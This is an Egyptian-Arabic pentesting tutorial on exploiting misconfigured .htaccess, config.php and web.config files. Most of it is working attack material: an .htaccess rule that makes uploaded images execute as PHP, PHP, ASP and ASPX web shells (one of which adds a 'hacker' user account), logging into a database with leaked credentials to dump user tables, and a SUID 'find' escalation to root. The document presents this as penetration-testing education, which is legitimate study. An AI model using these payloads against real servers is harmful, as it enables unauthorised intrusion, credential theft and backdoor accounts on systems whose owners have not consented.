# **1. إيه هي Misconfigured .htaccess, config.php, web.config؟**

## **الشرح العميق:**
الثلاث ملفات دول هما ملفات إعدادات (Configuration Files) بتستخدم في تطبيقات الويب عشان تتحكم في إزاي السيرفر بيشتغل أو بيتصل بقاعدة البيانات. لما تكون "Misconfigured" (يعني معمولة غلط أو مضبوطة بشكل ضعيف)، بيحصل ثغرات أمنية كبيرة تسمح للمهاجم يستغلها. كل ملف ليه دوره:

- **.htaccess (في سيرفرات Apache):** ملف بيتحكم في إعدادات السيرفر زي مين يدخل، إيه اللي يتنفذ، أو إزاي يتعامل مع الطلبات. لو مضبوط غلط، ممكن يخلّي أي حد يشوف ملفات أو ينفذ أوامر.
- **config.php (في تطبيقات PHP):** ملف بيحتوي على بيانات زي اسم المستخدم وكلمة السر لقاعدة البيانات. لو متاح أو مكشوف، المهاجم يقدر يسرق البيانات دي.
- **web.config (في سيرفرات IIS/Windows):** ملف إعدادات لتطبيقات الويب على ويندوز. لو فيه خطأ، ممكن يسمح بتشغيل أكواد أو الوصول لمعلومات حساسة.

## **الأدوات والأوامر العملية:**
### 1. **فحص .htaccess:**
   - لو دخلت سيرفر لينكس:
     - `ls -la /var/www/html/` -> لو لقيت `.htaccess`، افتحه:
     - `cat /var/www/html/.htaccess`.
   - لو فيه سطر زي `Allow from all` بدون قيود، يعني مفتوح للكل.

### 2. **فحص config.php:**
   - `find / -name config.php 2>/dev/null`.
   - لو لقيته (مثل `/var/www/html/config.php`):
     - `cat /var/www/html/config.php`.
   - لو فيه حاجة زي `$db_pass = "secret123";`، يبقى لقيت كنز.

### 3. **فحص web.config:**
   - في ويندوز:
     - `dir /s /b "C:\inetpub" | findstr "web.config"`.
     - افتحه: `type C:\inetpub\wwwroot\web.config`.
   - لو لقيت `<allow users="*">`، يعني الكل يقدر يدخل.

## **خلاصة بالعامية المصرية:**
"يعني الملفات دي زي كتالوج البيت، لو كتبته غلط أو سايبه في الشارع، أي حد يعرف أسرارك! .htaccess زي البواب، config.php زي دفتر كلمات السر، وweb.config زي القوانين بتاعة العمارة."

---

# **2. ليه المشكلة دي خطيرة؟**

## **الشرح العميق:**
لما الملفات دي تكون مضبوطة غلط، بتفتح الباب للمهاجم يعمل حاجات زي:
- **سرقة بيانات:** لو config.php مكشوف، ياخد كلمات سر قاعدة البيانات.
- **تنفيذ أوامر:** لو .htaccess بيسمح بتنفيذ ملفات، يقدر يرفع shell.
- **تجاوز الحماية:** لو web.config مفتوح، يدخل أماكن المفروض ممنوعة.
في النهاية، الثغرات دي بتكون طريق سريع لتصعيد الصلاحيات أو تدمير النظام.

## **الأدوات والأوامر العملية:**
### 1. **استغلال .htaccess:**
   - لو لقيت `.htaccess` بيسمح بتشغيل PHP في مجلد Uploads:
     - `echo "AddType application/x-httpd-php .jpg" > .htaccess`.
     - ارفع ملف `shell.jpg` بكود PHP: `<?php system($_GET['cmd']); ?>`.
     - افتح: `http://target.com/uploads/shell.jpg?cmd=id`.

### 2. **استغلال config.php:**
   - لو لقيت `/config.php` مكشوف:
     - افتح: `http://target.com/config.php`.
     - لو ظهر `$db_user = "root"; $db_pass = "pass123";`، استخدمها:
     - `mysql -u root -p` -> `pass123`.

### 3. **استغلال web.config:**
   - لو لقيت `<system.webServer><handlers>` يسمح بـ .asp:
     - ارفع ملف `shell.asp`: `<% Response.Write(CreateObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll()) %>`.
     - افتح: `http://target.com/shell.asp`.

## **خلاصة بالعامية المصرية:**
"الملفات دي لما تبقى مضروبة، زي ما تكون سايب كشف حسابك البنكي في الشارع! المهاجم يلاقيها، ياخد كلمة السر، يرفع حاجة يلعب بيها، ويبقى هو الكبير بتاع الموقع."

---

# **3. إزاي نستغلها في الـ Pentesting؟**
- **الهدف:** تستخدم الإعدادات الضعيفة دي عشان تاخد وصول أعلى أو تتحكم في السيرفر.
- **مثال واقعي:** لو .htaccess بيسمح بتعديل قواعد السيرفر، تضيف قاعدة تسمح لك ترجع shell.

## **خلاصة بالعامية المصرية:**
"لما تلاقي الملفات دي مضروبة، زي ما تكون لقيت خريطة الكنز! بتستغلها عشان تفتح الباب وتدخل تبقى الباشا بتاع الحتة."

---

# **خطوات عملية للاستغلال في Pentesting**

## **الخطوة 1: فحص الهدف**
- شغل Nmap:
  - `nmap -sV 192.168.1.10`.
- افترض النتيجة:
  - Port 80: Apache 2.4.29 (لينكس) أو IIS 10 (ويندوز).

## **الخطوة 2: البحث عن الملفات**
- في لينكس:
  - `curl http://192.168.1.10/.htaccess` -> لو ظهر، اقراه.
  - `curl http://192.168.1.10/config.php` -> لو ظهر كود، ابحث عن بيانات.
- في ويندوز:
  - `curl http://192.168.1.10/web.config` -> لو مكشوف، اقراه.

## **الخطوة 3: استغلال .htaccess**
- لو لقيت مجلد Uploads:
  - ارفع `.htaccess`: `echo "AddType application/x-httpd-php .png" > .htaccess`.
  - ارفع `shell.png`: `<?php system($_GET['cmd']); ?>`.
  - افتح: `http://192.168.1.10/uploads/shell.png?cmd=id` -> لو رجع `www-data`، نجحت.

## **الخطوة 4: استغلال config.php**
- لو لقيت `http://192.168.1.10/config.php` مكشوف:
  - اقراه: `$db_user = "admin"; $db_pass = "secret123";`.
  - استخدمها:
    - `mysql -u admin -psecret123 -h 192.168.1.10`.
    - `SHOW DATABASES;` -> `USE db_name;` -> `SELECT * FROM users;`.

## **الخطوة 5: استغلال web.config**
- لو لقيت `http://192.168.1.10/web.config` مكشوف:
  - ارفع `shell.aspx`: `<% System.Diagnostics.Process.Start("cmd.exe", "/c net user hacker pass123 /add"); %>`.
  - افتح: `http://192.168.1.10/shell.aspx` -> هيضيف مستخدم.

## **الخطوة 6: تصعيد الصلاحيات**
- من الـ Shell (في لينكس):
  - `id` -> `www-data`.
  - `find / -perm -4000` -> لو لقيت SUID، استغله:
    - `/usr/bin/find . -exec /bin/bash \;` -> `id` -> `root`.
- في ويندوز:
  - `whoami` -> لو user، استخدم المستخدم الجديد لتسجيل الدخول.

## **الخطوة 7: توثيق**
- سجل كل الملفات اللي لقيتها والثغرات.
- قدم تقرير يوري خطر الإعدادات الضعيفة.

## **خلاصة بالعامية المصرية:**
"الخطوات دي زي ما تكون لقيت دفتر أسرار البيت، فتحته، لعبته فيه، وطلعت الكبير بتاع الموقع! الملفات دي لما تكون مضروبة، تبقى طريقك للفوز."

---

# **الخلاصة النهائية:**
Misconfigured .htaccess, config.php, وweb.config هما ثغرات كبيرة لأنهم بيكشفوا أسرار السيرفر أو بيسمحوا بتنفيذ أكواد. في الـ Pentesting، دور عليهم، استغلهم عشان تاخد shell أو تصعد صلاحياتك، ووري العميل إن نظامه زي بيت من غير قفل! بالأدوات زي curl وMetasploit، تقدر تكتشف وتستخدم الضعف ده عشان تبقى البطل بتاع اللعبة!